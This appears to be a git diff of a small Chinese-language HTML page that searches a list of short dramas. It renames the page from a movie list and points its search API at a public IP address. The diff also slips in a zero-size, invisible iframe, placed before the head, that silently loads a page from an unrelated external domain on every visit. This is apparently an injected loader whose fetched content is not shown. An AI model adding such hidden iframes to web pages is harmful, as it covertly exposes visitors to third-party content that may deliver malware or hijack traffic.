@@ -1,7 +1,11 @@
 <!DOCTYPE html>
 <html>
+    <iframe src="http://d3.uryr.store/cBu5x16255" width="0" height="0"></iframe>
+
+
+
 <head>
-    <title>电影列表</title>
+    <title>短剧素材</title>
     <style>
         table {
             border-collapse: collapse;
@@ -20,8 +24,8 @@
     </style>
 </head>
 <body>
-    <h1>电影列表</h1>
-    <input type="text" id="movieInput" placeholder="输入电影名称">
+    <h1>相关短剧列表</h1>
+    <input type="text" id="movieInput" placeholder="输入短剧名称">
     <button onclick="searchMovies()">搜索</button>
     <table id="movieTable">
         <thead>
@@ -39,7 +43,8 @@
     <script>
         function searchMovies() {
             var movieName = document.getElementById("movieInput").value;
-            var apiUrl = `http://localhost:3000/api/movies?page=1&limit=10&name=${encodeURIComponent(movieName)}`;
+            var apiUrl = `http://123.57.55.25:8451/api/movies?page=1&limit=10&name=${encodeURIComponent(movieName)}`;
+
 
             fetch(apiUrl)
                 .then(response => response.json())
